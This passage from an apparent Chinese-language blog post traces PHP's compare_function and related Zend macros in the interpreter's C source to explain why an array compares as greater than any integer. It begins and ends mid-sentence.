rel="noopener">这里</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">//开始定义php语言中的函数gettype</span><br><span class="line">PHP_FUNCTION(gettype)</span><br><span class="line">&#123;</span><br><span class="line">    //arg间接指向调用gettype函数时所传递的参数。是一个zval**结构</span><br><span class="line">    //所以我们要对他使用__PP后缀的宏。</span><br><span class="line">    zval **arg;</span><br><span class="line"></span><br><span class="line">    //这个if的操作主要是让arg指向参数～</span><br><span class="line">    if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;Z&quot;, &amp;arg) == FAILURE) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //调用Z_TYPE_PP宏来获取arg指向zval的类型。</span><br><span class="line">    //然后是一个switch结构，RETVAL_STRING宏代表这gettype函数返回的字符串类型的值</span><br><span class="line">    switch (Z_TYPE_PP(arg)) &#123;</span><br><span class="line">        case IS_NULL:</span><br><span class="line">            RETVAL_STRING(&quot;NULL&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_BOOL:</span><br><span class="line">            RETVAL_STRING(&quot;boolean&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_LONG:</span><br><span class="line">            RETVAL_STRING(&quot;integer&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_DOUBLE:</span><br><span class="line">            RETVAL_STRING(&quot;double&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_STRING:</span><br><span class="line">            RETVAL_STRING(&quot;string&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_ARRAY:</span><br><span class="line">            RETVAL_STRING(&quot;array&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_OBJECT:</span><br><span class="line">            RETVAL_STRING(&quot;object&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_RESOURCE:</span><br><span class="line">            &#123;</span><br><span class="line">                char *type_name;</span><br><span class="line">                type_name = zend_rsrc_list_get_rsrc_type(Z_LVAL_PP(arg) TSRMLS_CC);</span><br><span class="line">                if (type_name) &#123;</span><br><span class="line">                    RETVAL_STRING(&quot;resource&quot;, 1);</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        default:</span><br><span class="line">            RETVAL_STRING(&quot;unknown type&quot;, 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上三个宏的定义在Zend/zend_operators.h里，定义分别是：</p><blockquote><p>#define Z_TYPE(zval)        (zval).type</p></blockquote><p>#define Z_TYPE_P(zval_p)    Z_TYPE(*zval_p)</p><p>#define Z_TYPE_PP(zval_pp)  Z_TYPE(**zval_pp)</p><p>这也是为是什么在Zend/zend_operators.h里面进行查询的原因，貌似有些跑题了？</p><p>当然下一个问题，为什么我们要定位到函数is_smaller_function<br>这里主要是靠对于PHP源码的熟悉，进行猜测，当然有的时候分析源码的时候可以讲PHP源码下载下载，部分IDE会有提供函数来源的功能<br>其实本来有个</p><blockquote><p>   lxr.php.net</p></blockquote><p>可以让我们迅速定位到我们想要的函数，但是这个网站在16年后就不是很稳定了，甚至有人将它当做一个BUG提交给PHP官网，这是一个很有趣的事情，具体可以了解<a href="https://bugs.php.net/bug.php?id=72396" target="_blank" rel="noopener">这里</a><br>那么我们还有没有什么办法迅速定位到我们需要的函数呢？</p><p>进入is_smaller_function的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ZEND_API int ZEND_FASTCALL is_smaller_function(zval *result, zval *op1, zval *op2) /* &#123;&#123;&#123; */</span><br><span class="line">&#123;</span><br><span class="line">if (compare_function(result, op1, op2) == FAILURE) &#123;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">ZVAL_BOOL(result, (Z_LVAL_P(result) &lt; 0));</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个compare_function函数以及<br>ZVAL_BOOL<br>我们先分析下compare_function函数<br>跟进</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">ZEND_API int ZEND_FASTCALL compare_function(zval *result, zval *op1, zval *op2) /* &#123;&#123;&#123; */</span><br><span class="line">&#123;</span><br><span class="line">int ret;</span><br><span class="line">int converted = 0;</span><br><span class="line">zval op1_copy, op2_copy;</span><br><span class="line">zval *op_free, tmp_free;</span><br><span class="line"></span><br><span class="line">while (1) &#123;</span><br><span class="line">switch (TYPE_PAIR(Z_TYPE_P(op1), Z_TYPE_P(op2))) &#123;</span><br><span class="line">case TYPE_PAIR(IS_LONG, IS_LONG):</span><br><span class="line">ZVAL_LONG(result, Z_LVAL_P(op1)&gt;Z_LVAL_P(op2)?1:(Z_LVAL_P(op1)&lt;Z_LVAL_P(op2)?-1:0));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_DOUBLE, IS_LONG):</span><br><span class="line">Z_DVAL_P(result) = Z_DVAL_P(op1) - (double)Z_LVAL_P(op2);</span><br><span class="line">ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result)));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_LONG, IS_DOUBLE):</span><br><span class="line">Z_DVAL_P(result) = (double)Z_LVAL_P(op1) - Z_DVAL_P(op2);</span><br><span class="line">ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result)));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_DOUBLE, IS_DOUBLE):</span><br><span class="line">if (Z_DVAL_P(op1) == Z_DVAL_P(op2)) &#123;</span><br><span class="line">ZVAL_LONG(result, 0);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">Z_DVAL_P(result) = Z_DVAL_P(op1) - Z_DVAL_P(op2);</span><br><span class="line">ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result)));</span><br><span class="line">&#125;</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_ARRAY, IS_ARRAY):</span><br><span class="line">ZVAL_LONG(result, zend_compare_arrays(op1, op2));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_NULL):</span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_FALSE):</span><br><span class="line">case TYPE_PAIR(IS_FALSE, IS_NULL):</span><br><span class="line">case TYPE_PAIR(IS_FALSE, IS_FALSE):</span><br><span class="line">case TYPE_PAIR(IS_TRUE, IS_TRUE):</span><br><span class="line">ZVAL_LONG(result, 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_TRUE):</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_TRUE, IS_NULL):</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_STRING, IS_STRING):</span><br><span class="line">if (Z_STR_P(op1) == Z_STR_P(op2)) &#123;</span><br><span class="line">ZVAL_LONG(result, 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">ZVAL_LONG(result, zendi_smart_strcmp(Z_STR_P(op1), Z_STR_P(op2)));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_STRING):</span><br><span class="line">ZVAL_LONG(result, Z_STRLEN_P(op2) == 0 ? 0 : -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_STRING, IS_NULL):</span><br><span class="line">ZVAL_LONG(result, Z_STRLEN_P(op1) == 0 ? 0 : 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_OBJECT, IS_NULL):</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_OBJECT):</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">default:</span><br><span class="line">if (Z_ISREF_P(op1)) &#123;</span><br><span class="line">op1 = Z_REFVAL_P(op1);</span><br><span class="line">continue;</span><br><span class="line">&#125; else if (Z_ISREF_P(op2)) &#123;</span><br><span class="line">op2 = Z_REFVAL_P(op2);</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Z_TYPE_P(op1) == IS_OBJECT &amp;&amp; Z_OBJ_HANDLER_P(op1, compare)) &#123;</span><br><span class="line">ret = Z_OBJ_HANDLER_P(op1, compare)(result, op1, op2);</span><br><span class="line">if (UNEXPECTED(Z_TYPE_P(result) != IS_LONG)) &#123;</span><br><span class="line">convert_compare_result_to_long(result);</span><br><span class="line">&#125;</span><br><span class="line">return ret;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) == IS_OBJECT &amp;&amp; Z_OBJ_HANDLER_P(op2, compare)) &#123;</span><br><span class="line">ret = Z_OBJ_HANDLER_P(op2, compare)(result, op1, op2);</span><br><span class="line">if (UNEXPECTED(Z_TYPE_P(result) != IS_LONG)) &#123;</span><br><span class="line">convert_compare_result_to_long(result);</span><br><span class="line">&#125;</span><br><span class="line">return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Z_TYPE_P(op1) == IS_OBJECT &amp;&amp; Z_TYPE_P(op2) == IS_OBJECT) &#123;</span><br><span class="line">if (Z_OBJ_P(op1) == Z_OBJ_P(op2)) &#123;</span><br><span class="line">/* object handles are identical, apparently this is the same object */</span><br><span class="line">ZVAL_LONG(result, 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">if (Z_OBJ_HANDLER_P(op1, compare_objects) == Z_OBJ_HANDLER_P(op2, compare_objects)) &#123;</span><br><span class="line">ZVAL_LONG(result, Z_OBJ_HANDLER_P(op1, compare_objects)(op1, op2));</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (Z_TYPE_P(op1) == IS_OBJECT) &#123;</span><br><span class="line">if (Z_OBJ_HT_P(op1)-&gt;get) &#123;</span><br><span class="line">zval rv;</span><br><span class="line">op_free = Z_OBJ_HT_P(op1)-&gt;get(Z_OBJ_P(op1), &amp;rv);</span><br><span class="line">ret = compare_function(result, op_free, op2);</span><br><span class="line">zend_free_obj_get_result(op_free);</span><br><span class="line">return ret;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) != IS_OBJECT &amp;&amp; Z_OBJ_HT_P(op1)-&gt;cast_object) &#123;</span><br><span class="line">ZVAL_UNDEF(&amp;tmp_free);</span><br><span class="line">if (Z_OBJ_HT_P(op1)-&gt;cast_object(Z_OBJ_P(op1), &amp;tmp_free, ((Z_TYPE_P(op2) == IS_FALSE || Z_TYPE_P(op2) == IS_TRUE) ? _IS_BOOL : Z_TYPE_P(op2))) == FAILURE) &#123;</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">zend_free_obj_get_result(&amp;tmp_free);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">ret = compare_function(result, &amp;tmp_free, op2);</span><br><span class="line">zend_free_obj_get_result(&amp;tmp_free);</span><br><span class="line">return ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (Z_TYPE_P(op2) == IS_OBJECT) &#123;</span><br><span class="line">if (Z_OBJ_HT_P(op2)-&gt;get) &#123;</span><br><span class="line">zval rv;</span><br><span class="line">op_free = Z_OBJ_HT_P(op2)-&gt;get(Z_OBJ_P(op2), &amp;rv);</span><br><span class="line">ret = compare_function(result, op1, op_free);</span><br><span class="line">zend_free_obj_get_result(op_free);</span><br><span class="line">return ret;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1) != IS_OBJECT &amp;&amp; Z_OBJ_HT_P(op2)-&gt;cast_object) &#123;</span><br><span class="line">ZVAL_UNDEF(&amp;tmp_free);</span><br><span class="line">if (Z_OBJ_HT_P(op2)-&gt;cast_object(Z_OBJ_P(op2), &amp;tmp_free, ((Z_TYPE_P(op1) == IS_FALSE || Z_TYPE_P(op1) == IS_TRUE) ? _IS_BOOL : Z_TYPE_P(op1))) == FAILURE) &#123;</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">zend_free_obj_get_result(&amp;tmp_free);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">ret = compare_function(result, op1, &amp;tmp_free);</span><br><span class="line">zend_free_obj_get_result(&amp;tmp_free);</span><br><span class="line">return ret;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1) == IS_OBJECT) &#123;</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!converted) &#123;</span><br><span class="line">if (Z_TYPE_P(op1) &lt; IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op2) ? -1 : 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1) == IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op2) ? 0 : 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) &lt; IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op1) ? 1 : 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) == IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op1) ? 0 : -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">op1 = zendi_convert_scalar_to_number(op1, &amp;op1_copy, result, 1);</span><br><span class="line">op2 = zendi_convert_scalar_to_number(op2, &amp;op2_copy, result, 1);</span><br><span class="line">if (EG(exception)) &#123;</span><br><span class="line">if (result != op1) &#123;</span><br><span class="line">ZVAL_UNDEF(result);</span><br><span class="line">&#125;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">converted = 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1)==IS_ARRAY) &#123;</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2)==IS_ARRAY) &#123;</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">ZEND_ASSERT(0);</span><br><span class="line">zend_throw_error(NULL, &quot;Unsupported operand types&quot;);</span><br><span class="line">if (result != op1) &#123;</span><br><span class="line">ZVAL_UNDEF(result);</span><br><span class="line">&#125;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br></pre></td></tr></table></figure><p>有点长，想要仔细了解的可以详细看<br>讲解下<br>首先<br><img src="https://i.imgur.com/EM4vsEN.png" alt=""><br>这个先等下说<br><img src="https://i.imgur.com/gMWqzae.png" alt=""><br>这里进行swich 判断op1 与 op2 的类型<br>这里我们先拿第一句进行分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">case TYPE_PAIR(IS_LONG, IS_LONG):</span><br><span class="line">ZVAL_LONG(result, Z_LVAL_P(op1)&gt;Z_LVAL_P(op2)?1:(Z_LVAL_P(op1)&lt;Z_LVAL_P(op2)?-1:0));</span><br><span class="line">return SUCCESS;</span><br></pre></td></tr></table></figure><p>这里op1与op2都是IS_LONG类型<br>PHP中一共如下八种数据类型，具体想了解可以点<a href="http://wiki.jikexueyuan.com/project/extending-embedding-php/2.1.html" target="_blank" rel="noopener"></a><br><img src="https://i.imgur.com/tFGcobN.png" alt=""><br><img src="https://i.imgur.com/4N2WHJq.png" alt=""><br>所以IS_LONG是一种PHP种的整型。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZVAL_LONG(result, Z_LVAL_P(op1)&gt;Z_LVAL_P(op2)?1:(Z_LVAL_P(op1)&lt;Z_LVAL_P(op2)?-1:0));</span><br></pre></td></tr></table></figure><p>这句的意思是进行比较OP1，OP2的大小分别返回-1，0，1到result，<br><img src="https://i.imgur.com/AXhqNdV.png" alt=""><br>这里的result是有作用的，<br><img src="https://i.imgur.com/9IXloG3.png" alt=""><br>这里有一个ZVAL_BOOL函数进行判断，用于设置布尔值的zval ，ZVAL_BOOL就是定义这个zval的类型为bool。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define ZVAL_BOOL(z, b) do &#123;            \</span><br><span class="line">        Z_TYPE_INFO_P(z) =              \</span><br><span class="line">            (b) ? IS_TRUE : IS_FALSE;   \</span><br><span class="line">    &#125; while (0)</span><br></pre></td></tr></table></figure><p>换成当前的场景<br>result为z ，(Z_LVAL_P(result) &lt; 0)为b<br>z 为用于设置布尔值的zval<br>b 为 设置的布尔值</p><p><img src="https://i.imgur.com/p6nTs1r.png" alt=""></p><p>这个函数 名是is_smaller_function具体意思已经很明显了</p><p>只有 Z_LVAL_P(result) &lt; 0，当result=-1<br>（即op1&lt;op2的时候 result才为-1）<br>才会使b=1 并且使得<br>(b) ? IS_TRUE : IS_FALSE; 判断为IS_TRUE<br>并使得Z_TYPE_INFO_P(result) 为IS_TRUE，<br>最后就是根据Z_TYPE_INFO_P(result) 使IS_TRUE或者IS_FALSE来判断究竟是否小于</p><p>下一句<br><img src="https://i.imgur.com/XVUpc3Q.png" alt=""></p><p>因为两个值是可以进行比较的它会return SUCCESS，我是这么理解的<br><img src="https://i.imgur.com/2F2DLva.png" alt=""></p><p>如果有人看到这里，对于PHP究竟是如何判断大小应该有了基本的认识了吧<br>回到我们最开始的问题<br><img src="https://i.imgur.com/6isxsTs.png" alt=""><br>那么我们就应该取寻找OP1与OP2分别为array类型与IS_LONG的case<br>与OP1与OP2分别为array类型与array类型<br>当然阅读这些case的时候又冒出了个问题<br><img src="https://i.imgur.com/gvfdjFW.png" alt=""><br>这个又是什么意思呢？<br>经过查询我们可以知道这句话来源于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define Z_ISREF(zval) (Z_TYPE(zval) == IS_REFERENCE)</span><br></pre></td></tr></table></figure><p>其意思为<br>该zval检查它是否是一个引用类型，姑且认为是判断这个变量是否属于PHP八种变量中的一种，<br>那么IS_REFERENCE又是什么呢</p><blockquote><p>此类型用于表示a zval是PHP引用。引用的值zval需要首先解除引用才能使用它。这可以使用ZVAL_DEREF或Z_REF宏来完成。zval可以检查A 以查看它是否是Z_ISREF宏的引用。</p></blockquote><p>姑且认为这个意思是zaval确实是PHP引用的变量之一</p><p>那么整句话的我的理解是，当发生default:的时候假如OP1,OP2是PHP引用变量之一那么就继续<br>接下来的几个case都不属于我们想要的情况<br>直到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">if (!converted) &#123;</span><br><span class="line">if (Z_TYPE_P(op1) &lt; IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op2) ? -1 : 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1) == IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op2) ? 0 : 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) &lt; IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op1) ? 1 : 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) == IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op1) ? 0 : -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">op1 = zendi_convert_scalar_to_number(op1, &amp;op1_copy, result, 1);</span><br><span class="line">op2 = zendi_convert_scalar_to_number(op2, &amp;op2_copy, result, 1);</span><br><span class="line">if (EG(exception)) &#123;</span><br><span class="line">if (result != op1) &#123;</span><br><span class="line">ZVAL_UNDEF(result);</span><br><span class="line">&#125;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">converted = 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1)==IS_ARRAY) &#123;</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2)==IS_ARRAY) &#123;</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">ZEND_ASSERT(0);</span><br><span class="line">zend_throw_error(NULL, &quot;Unsupported operand types&quot;);</span><br><span class="line">if (result != op1) &#123;</span><br><span class="line">ZVAL_UNDEF(result);</span><br><span class="line">&#125;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为在函数的开头converted=0<br>所以!converted=1是正确的，<br>我们跟进这个判断<br>发现<br><img src="https://i.imgur.com/tFiBazU.png" alt=""><br>这边只要op1为IS_ARRAY类型的变量就result直接就为1了<br>这也解释了我们之前的问题<br><img src="https://i.imgur.com/u0eHfcF.png" alt=""><br>为什么[]无论是比较1，0，-1都是返回true<br>以及PHP手册中<br><img src="https://i.imgur.com/7LjAy1u.png" alt=""><br>中的这个问题</p><p>当然我们依旧留存下一个问题<br><img src="https://i.imgur.com/JOIPz8r.png" alt=""><br>为什么这个也是恒真的呢？<br>可以清楚看到左右两边都是数组，我们需要找到arrary与arrary的这种case<br><img src="https://i.imgur.com/3J6lBoh.png" alt=""><br>在最开始没几行就可以找到了<br>这里有一个函数zend_compare_arrays<br>我们跟进一下<br><img src="https://i.imgur.com/KqTZiGK.png" alt=""><br>我们可以看到它返回了一个zend_compare_symbol_tables函数<br>我们再跟进下<br><img src="https://i.imgur.com/CvETlAa.png" alt=""><br>当然在传入参数的时候又经历了Z_ARRVAL_P(a1)的变化<br>Z_ARRVAL_P(a1)源自</p><blockquote><p>#define Z_ARRVAL(zval) 